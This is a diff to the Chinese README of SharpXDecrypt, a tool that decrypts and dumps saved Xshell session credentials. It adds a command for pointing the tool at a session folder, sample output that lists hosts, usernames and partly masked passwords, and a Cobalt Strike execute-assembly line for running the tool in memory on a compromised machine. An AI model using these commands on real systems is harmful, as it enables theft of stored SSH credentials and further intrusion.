@@ -14,7 +14,7 @@ Xshell全版本凭证一键导出工具，针对Xshell全版本在本地保存�
 
 ## 使用方法
 
-#### cmd.exe
+#### cmd.exe 自动寻找session路径
 
 ```
 C:\Users\asus\Desktop\DEV\SharpXDecrypt\bin\Debug> .\SharpXDecrypt.exe
@@ -53,12 +53,42 @@ Github: https://github.com/JDArmy
   Version: 7.1
 ```
 
+#### cmd.exe 指定session路径
+
+```
+C:\Users\asus\Desktop\DEV\SharpXDecrypt\bin\Release> .\SharpXDecrypt.exe "C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions"
+
+Xshell全版本凭证一键导出工具!(支持Xshell 7.0+版本)
+Author: 0pen1
+Github: https://github.com/JDArmy
+[!] WARNING: For learning purposes only,please delete it within 24 hours after downloading!
+
+[*] Start GetUserSID....
+  Username: asus
+  userSID: S-1-5-21-736521517-4232353097-1340300005-1001
+[*] GetUserSID Success !
+
+  XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\192.168.1.110.xsh
+  Host: 192.168.1.110
+  UserName: wwwuser
+  Password: www*******qx
+  Version: 7.1
+
+  XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\新建会话.xsh
+  Host: 127.0.0.1
+  UserName: root
+  Password: 78******6
+  Version: 7.1
+
+[*] read done!
+```
 
 
 #### Cobalt Strike
 
 ```
 execute-assembly /path/to/SharpXDecrypt.exe
+execute-assembly /path/to/SharpXDecrypt.exe  "C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions"
 ```
 
 
@@ -66,6 +96,8 @@ execute-assembly /path/to/SharpXDecrypt.exe
 ## 更新日志 
 
 - v0.1.0, 2022-02-22, 创建
+- v0.1.1, 2022-02-23, 修复中文用户名解密失败问题
+- v0.1.2, 2022-02-23, 修复Xshell5执行报错问题，增加执行session路径功能
 
 
 
